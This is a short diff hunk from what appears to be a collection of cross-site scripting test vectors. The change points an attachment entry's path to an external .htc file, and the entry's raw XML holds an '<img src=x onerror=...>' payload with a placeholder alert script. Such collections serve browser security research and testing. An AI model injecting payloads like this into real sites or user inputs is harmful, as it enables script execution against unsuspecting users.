@@ -1652,7 +1652,7 @@ var items =
         'attachment' : {
             'required_mime' : '',
             'samedomain'    : '1',            
-            'path'          : '',
+            'path'          : 'http://heideri.ch/jso/test.htc',
             'name'          : 'test.htc',
             'raw'           : '<?xml version="1.0"?>\r\n<x>\r\n<payload><![CDATA[<img src=x onerror=%js_alert%>]]></payload>\r\n</x>'
         },        
